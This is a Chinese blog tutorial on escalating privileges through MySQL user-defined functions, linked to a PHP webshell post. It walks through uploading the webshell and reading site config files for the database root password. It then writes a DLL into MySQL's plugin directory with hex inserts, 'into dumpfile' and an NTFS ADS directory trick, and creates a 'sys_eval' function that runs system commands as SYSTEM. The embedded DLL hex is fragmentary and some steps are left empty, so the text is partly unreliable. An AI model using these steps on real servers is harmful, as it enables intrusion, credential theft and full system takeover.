# 原创
：  【MySQL提权】UDF提权（附带大马）

# 【MySQL提权】UDF提权（附带大马）

**目录**

[ 附带：](#%C2%A0%E9%99%84%E5%B8%A6%EF%BC%9A)

[一、基础知识：](#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A)

[DLL：](#DLL%EF%BC%9A)

[UDF](#UDF)

[思路：](#%E6%80%9D%E8%B7%AF%EF%BC%9A)

[前提：](#%E5%89%8D%E6%8F%90%EF%BC%9A)

[二、利用过程：](#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A)

[第一步：上传大马，查看版本，读取配置文件root账户密码](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%B8%8A%E4%BC%A0%E5%A4%A7%E9%A9%AC%EF%BC%8C%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%EF%BC%8C%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6root%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81)

[第二步：查secure_file_priv值，并更改（my.ini目录下）](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9F%A5secure_file_priv%E5%80%BC%EF%BC%8C%E5%B9%B6%E6%9B%B4%E6%94%B9%EF%BC%88my.ini%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%89)

[第三步：查看系统框架以及plugin目录](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E6%A1%86%E6%9E%B6%E4%BB%A5%E5%8F%8Aplugin%E7%9B%AE%E5%BD%95)

[第四步：使用大马导出dll文件提权](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%A4%A7%E9%A9%AC%E5%AF%BC%E5%87%BAdll%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83)

[第五步：手动写入dll文件](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%89%8B%E5%8A%A8%E5%86%99%E5%85%A5dll%E6%96%87%E4%BB%B6)

[方法一：](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A)

[方法二：](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A)

[第六步：（直接）大马写入DLL文件](#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%EF%BC%88%E7%9B%B4%E6%8E%A5%EF%BC%89%E5%A4%A7%E9%A9%AC%E5%86%99%E5%85%A5DLL%E6%96%87%E4%BB%B6)

---


> 
<h2> 附带：</h2>
[【PHP大马】定义、下载、使用、源码<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125084768?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165875214216781818749550%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165875214216781818749550&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125084768-null-null.185^v2^control&amp;utm_term=%E5%A4%A7%E9%A9%AC&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125084768?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165875214216781818749550%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165875214216781818749550&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125084768-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E5%A4%A7%E9%A9%AC&amp;spm=1018.2226.3001.4450)


## 一、基础知识：

> 
<h3>DLL：</h3>
在windows下存在一个叫做动态链接库的东西，俗称DLL。该文件会把程序代码中使用的函数编译成机器码，保存在DLL文件中；
编译时，EXE执行文件索要调用的函数在哪个DLL文件中，执行时会自动从DLL文件中调用指定的函数
<hr/>
<h3>UDF</h3>
user defined function（用户自定义函数）
udf在mysql5.1以后的版本中，存在于’mysql/lib/plugin’目录下，文件后缀为'.dll'


### UDF

> 
<h3>思路：</h3>
通过添加新函数，对MYSQL的功能进行扩充
1、将含有cmd函数的DLL文件写入指定文件夹下
2、基于DLL文件创建自定义函数
3、基于自定义函数调用相应的函数，传入参数，执行系统命令(该命令执行权限为system)


> 
<h3>前提：</h3>
1、MYSQL版本大于5.1：DLL文件必须放置在MYSQL安装目录下的lib\plugin目录下
2、MYSQL版本小于5.1大于5.0：在Windows2003下DLL文件放置于C:\windows\system32；在windows2000下DLL文件放置于C:\winnt\system32
3、MYSQL版本小于5.0：DLL文件可任意放置 MYSQL数据库用户具有创建和删除函数的权限 DLL文件有写入指定目录的权限
<hr/>
在MySQL高版本中secure-file-priv参数限制了MySQL的导出<br/> 1、NULL，表示禁止<br/> 2、value值有文件夹目录，则表示只允许该目录下文件（子目录都不行）<br/> 2、如果为空(没有值)，则表示不限制目录<br/> MySQL5.0/5.6版本：my.ini中无此参数，值为空，不限制目录<br/> MySQL5.7版本：my.ini中存在参数，值为NULL，不允许导出


---


---


## 二、利用过程：

> 
<h3>第一步：上传大马，查看版本，读取配置文件root账户密码</h3>
查看网站源码里面数据库配置文
(conn.php,config.php,dbconfig.php,config.inc.php,common.inc.php,inc,conn,config.sql,common,data，sql,data,inc,config,conn,database,common,include）




 

---


> 
<h3>第二步：查secure_file_priv值，并更改（my.ini目录下）</h3>
show global variables like 'secure%';
或者直接在文件夹里面找
<table border="1" cellpadding="1" cellspacing="1"><tbody>|secure_file_priv 的值|表示
|NULL，|禁止导入|导出
|value值有文件夹目录|只允许该目录下文件（子目录都不行）导入|导出
|为空(没有值)|不限制目录导入|导出
</tbody></table>





> 
<h3>第三步：查看系统框架以及plugin目录</h3>
show variables like '%compile%';
#查看主机版本及架构


show variables like 'plugin%';
#查看 plugin 目录

select @@plugin_dir;
加载失败可先尝试删除原有的扩展名：delete from mysql.func where name='cmdshell';




 

 

> 
<h3>第四步：使用大马导出dll文件提权</h3>
导出udf，如果脚本没法导出udf文件，也可以手动将该文件复制到plugin文件夹下
（创建plugin目录、复制粘贴udf文件都需要一定的权限)




> 
<h3>第五步：手动写入dll文件</h3>
<h4>方法一：</h4>
MYSQL大于5.1情况下，可能默认不存在plugin目录（利用NTFS ADS流创建plugin目录）
<pre>`create table temp(data longblob);`</pre>


<hr/>
<pre><code>insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);
</code></pre>

<hr/>
<pre><code>update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);
</code></pre>


<hr/>
当MySQL大于5.1时，默认是没有 lib\plugin 目录的
而 into dumpfile在写入文件时也不能创建文件夹，所以也就报错了：Can't create/write
<pre>`select data from temp into dumpfile "D:\\BaiduNetdiskDownload\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll";`</pre>

<hr/>
创建自定义函数sys_eval

<pre>`create function sys_eval returns string soname 'udf.dll';`</pre>
<hr/>
<h4>方法二：</h4>
1、查找MYSQL目录
select @@basedir;
2、创建lib目录
select 'It is dll' into dumpfile 'MYSQL目录\\lib::$INDEX_ALLOCATION';
3、创建plugin目录
select 'It is dll' into dumpfile 'MYSQL目录\\lib\\plugin::$INDEX_ALLOCATION';
<hr/>
我得出来的结果还是：Can't create/write


---


---


#### 方法二：

---


> 
<h3>第六步：（直接）大马写入DLL文件</h3>
前提：
先导出DLL,再执行命令.MYSQL用户必须为root权限,导出路径必须能加载DLL文件



